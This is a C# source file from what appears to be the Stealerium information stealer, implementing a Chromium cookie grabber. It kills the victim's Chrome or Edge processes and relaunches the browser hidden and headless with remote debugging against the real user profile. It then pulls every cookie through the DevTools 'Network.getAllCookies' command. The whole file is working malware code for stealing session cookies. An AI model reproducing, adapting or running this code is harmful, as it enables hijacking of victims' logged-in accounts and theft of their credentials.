using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Http;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Linq;
using Stealerium.Stub.Helpers;
using System.IO;

namespace Stealerium.Stub.Target.Browsers.Chromium
{
    internal class CdpCookieGrabber
    {
        private const int DEBUG_PORT = 9222;
        private static readonly HttpClient _httpClient = new HttpClient();

        public enum BrowserType
        {
            Chrome,
            Edge
        }

        public static async Task<List<Cookie>> GetCookiesViaCdp(BrowserType browserType = BrowserType.Chrome)
        {
            var cookies = new List<Cookie>();
            Process browserProcess = null;

            try
            {
                // Kill any existing Chrome/Edge processes that might be using the debug port
                foreach (var process in Process.GetProcesses())
                {
                    if ((browserType == BrowserType.Chrome && process.ProcessName.ToLower().Contains("chrome")) ||
                        (browserType == BrowserType.Edge && process.ProcessName.ToLower().Contains("msedge")))
                    {
                        try
                        {
                            process.Kill();
                            await Task.Delay(100);
                        }
                        catch { }
                    }
                }

                // Start browser with debugging
                browserProcess = LaunchBrowserWithDebugger(browserType);
                await Task.Delay(2000); // Wait longer for browser to start

                // Get the WebSocket URL
                var wsUrl = await GetDebuggerWebSocketUrl();
                if (string.IsNullOrEmpty(wsUrl))
                {
                    Logging.Log($"CDP >> Failed to get WebSocket URL for {browserType}");
                    return cookies;
                }

                Logging.Log($"CDP >> Connected to {browserType} WebSocket: {wsUrl}");

                // Connect and get cookies
                using (var ws = new ClientWebSocket())
                {
                    await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);

                    // Prepare the CDP command
                    var command = new
                    {
                        id = 1,
                        method = "Network.getAllCookies"
                    };

                    var commandJson = JsonConvert.SerializeObject(command);
                    var commandBytes = Encoding.UTF8.GetBytes(commandJson);
                    await ws.SendAsync(new ArraySegment<byte>(commandBytes), WebSocketMessageType.Text, true, CancellationToken.None);

                    // Receive response
                    var buffer = new byte[8192];
                    var result = new StringBuilder();

                    while (true)
                    {
                        var receiveResult = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                        result.Append(Encoding.UTF8.GetString(buffer, 0, receiveResult.Count));
                        if (receiveResult.EndOfMessage) break;
                    }

                    // Parse cookies from response
                    var response = JObject.Parse(result.ToString());
                    if (response["result"]?["cookies"] is JArray cookiesArray)
                    {
                        foreach (var cookieObj in cookiesArray)
                        {
                            cookies.Add(new Cookie
                            {
                                HostKey = cookieObj["domain"]?.ToString(),
                                Name = cookieObj["name"]?.ToString(),
                                Value = cookieObj["value"]?.ToString(),
                                Path = cookieObj["path"]?.ToString(),
                                IsSecure = (cookieObj["secure"]?.ToObject<bool>() ?? false).ToString(),
                                ExpiresUtc = ConvertExpiryTime(cookieObj["expires"]?.ToObject<double>() ?? 0)
                            });
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"CDP >> Error getting {browserType} cookies: {ex}");
            }
            finally
            {
                // Clean up browser process
                if (browserProcess != null && !browserProcess.HasExited)
                {
                    try
                    {
                        browserProcess.Kill();
                        await Task.Delay(500); // Wait for process to fully exit
                    }
                    catch (Exception ex) 
                    {
                        Logging.Log($"CDP >> Error killing browser process: {ex.Message}");
                    }
                }
            }

            return cookies;
        }

        private static bool IsDebugPortActive()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var response = client.GetAsync($"http://localhost:{DEBUG_PORT}/json/version").Result;
                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }

        private static async Task<string> GetDebuggerWebSocketUrl()
        {
            try
            {
                var response = await _httpClient.GetStringAsync($"http://localhost:{DEBUG_PORT}/json");
                var endpoints = JsonConvert.DeserializeObject<JArray>(response);
                var page = endpoints.FirstOrDefault(x => x["type"]?.ToString() == "page");
                return page?["webSocketDebuggerUrl"]?.ToString();
            }
            catch (Exception ex)
            {
                Logging.Log($"CDP >> Error getting debugger URL: {ex.Message}");
                return null;
            }
        }

        private static Process LaunchBrowserWithDebugger(BrowserType browserType)
        {
            string browserPath;
            string userDataDir;

            switch (browserType)
            {
                case BrowserType.Edge:
                    // Try both x86 and x64 paths for Edge
                    var edgePaths = new[]
                    {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Microsoft\\Edge\\Application\\msedge.exe"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Microsoft\\Edge\\Application\\msedge.exe")
                    };
                    browserPath = edgePaths.FirstOrDefault(File.Exists) ?? edgePaths[0];
                    userDataDir = Path.Combine(Paths.Lappdata, "Microsoft\\Edge\\User Data");
                    break;

                case BrowserType.Chrome:
                default:
                    // Try both x86 and x64 paths for Chrome
                    var chromePaths = new[]
                    {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Google\\Chrome\\Application\\chrome.exe"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Google\\Chrome\\Application\\chrome.exe")
                    };
                    browserPath = chromePaths.FirstOrDefault(File.Exists) ?? chromePaths[0];
                    userDataDir = Path.Combine(Paths.Lappdata, "Google\\Chrome\\User Data");
                    break;
            }

            // Log the browser path we're using
            Logging.Log($"CDP >> Launching {browserType} from: {browserPath}");
            Logging.Log($"CDP >> Using user data dir: {userDataDir}");

            var startInfo = new ProcessStartInfo
            {
                FileName = browserPath,
                Arguments = $"--remote-debugging-port={DEBUG_PORT} --headless=new --user-data-dir=\"{userDataDir}\" --disable-gpu --disable-logging",
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            return Process.Start(startInfo);
        }

        private static string ConvertExpiryTime(double unixTimestamp)
        {
            try
            {
                var dateTime = DateTimeOffset.FromUnixTimeSeconds((long)unixTimestamp);
                return dateTime.ToString("yyyy-MM-dd HH:mm:ss");
            }
            catch
            {
                return "Unknown";
            }
        }
    }
}
